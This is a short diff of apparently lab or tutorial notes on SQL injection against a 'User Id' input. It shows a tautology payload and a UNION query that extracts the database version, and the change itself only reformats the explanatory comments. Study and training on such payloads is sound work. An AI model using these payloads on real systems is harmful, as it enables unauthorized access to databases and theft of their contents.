@@ -9,12 +9,13 @@ User Id -> 1
 ```bash
  %' or '1'='1 
 ```
- (Always True Cond.) [Null id with % and then always true 1=1]
+ Always True Cond.) [Null id with % and then always true 1=1]
 
 ### Database Version Selection-->
 ```bash 
 %' or 0=0 union select null, version() #
- ```  (# represents the comment line in SQL query) [0=0 or 1=1]
+ ```  
+(# represents the comment line in SQL query) [0=0 or 1=1]
 
 ### Who owns the DB? 
 ```bash 
